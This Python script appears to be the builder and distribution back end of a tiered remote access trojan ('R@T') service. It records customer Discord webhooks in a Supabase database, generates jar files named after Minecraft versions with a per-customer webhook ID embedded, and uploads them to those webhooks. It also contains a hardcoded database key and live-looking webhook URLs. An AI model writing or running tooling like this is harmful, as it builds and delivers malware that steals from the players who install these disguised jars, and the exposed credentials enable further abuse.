from discord_webhook import DiscordWebhook, DiscordEmbed
import newhook, os, uuid
from supabase import create_client, Client, ClientOptions

supabase_url = 'https://djnunmhimrdnhvpldoew.supabase.co'
supabase_key = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqbnVubWhpbXJkbmh2cGxkb2V3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MDc4ODA2NzIsImV4cCI6MjAyMzQ1NjY3Mn0.y4W4Rv5SX9JoZWvZD9KMkC_XO80uPZmwb0mF1BqcGXw'
supabase: Client = create_client(supabase_url, supabase_key)

cwd = os.getcwd()


def sendUpdate(webhook):
    tier = 1
    # currentVersion = "all"
    # supabase.table('webhooks').insert({"DiscordUserName": str("seyTier"), "DiscordUserID": "000", "Webhook": webhook, "Tier": tier, "Version": currentVersion}).execute()
    senderwebhook = DiscordWebhook(url=webhook)
    embed = DiscordEmbed()
    embed.set_title(f'R@T UPDATE TIER: {tier}')
    # embed.set_description('@everyone')
    
    webhookID = str(uuid.uuid4())
    webhooksR = supabase.table('webhooks').select("*").execute().data
            
    #CHECK IF THAT WEBHOOK ALREADY IS BUILD
    userwebhooks = []
    for row in webhooksR:
        userwebhooks.append(row['Webhook'])
        
    if(webhook not in userwebhooks):
        #CHECK TO MAKE SURE THE USER CAN BUILD THAT RAT TIER
        supabase.table('webhooks').insert({"DiscordUserName": "seyTier", "DiscordUserID": "000", "Webhook": webhook, "webhookID": webhookID, "Tier": tier}).execute()
        print(f"adding to {webhook} database")
    else:
        webhooksR = supabase.table('webhooks').select("*").eq('Webhook',webhook).execute().data[0]
        webhookID = webhooksR['webhookID']

    for currentVersion in ["1.19.2", "1.20.1", "1.20.4"]:
        newhook.newWebhook(f"{cwd}/rat-{currentVersion}.jar",f"{currentVersion}",webhookID)
        with open(f"{cwd}/rat-{currentVersion}.jar", 'rb') as f:
            file_data = f.read() 
        senderwebhook.add_file(file_data, f"rat-{currentVersion}.jar")
        os.remove(f"{cwd}/rat-{currentVersion}.jar")

    response = senderwebhook.execute()
    print(response)
                    
def sendNewRats():
    webhooks = [
        # "https://discord.com/api/webhooks/1252092049625321572/KqKTxxvW-_XqO5NCKLwoZxO2XldLuI0WKNN5vaWjLIngVAp8WIf-PGBIX_H1fLdxyPdt",
        # "https://discord.com/api/webhooks/1252102005246398556/DVBAHCDCGGkUmi3cYkqd39Kyca_xMEpdvlkrSkf25d0CQJeX9AYOJ5eRoZ8wLT6ABAUR"
        
        # "https://discord.com/api/webhooks/1252102874394136596/nUEFIt-FO1V9hgRQAn8jGVzpHWUoyQTD9ftgoBXWUTR_Ts_3HGOL2IU8Dn6Fa4Kuzk8z",
        # "https://discord.com/api/webhooks/1252103356957069424/t2E4ARmJCrHV3ggniG8cMSncskcSVbv8zEICjP3fbO0Vns85pBad1lOqfHY7I8bQCYo6",
        # "https://discord.com/api/webhooks/1252103104975999069/u6HNcv86gJj5KBwv0Sr5IQFSQ6RprnmP_3J3nMVu5kBjvPv-FaMJ1f2z-RumEh6TGmVx"
        
        "https://discord.com/api/webhooks/1252103692224696390/HFHGgFpdzVrU530OduqVMelj5145YXja46D55AEGi9McuJtpJrntXBmFu2acY1oirpd3",
        "https://discord.com/api/webhooks/1252103923880169502/IUgCQKPjUIRyR2vZTf_08bSe24HVtI28ANVFhWuf1K6BzqGSuxVhAsc9zi46tMAKuV9l"
    ]
    for hook in webhooks:
        sendUpdate(hook)
                    
sendNewRats()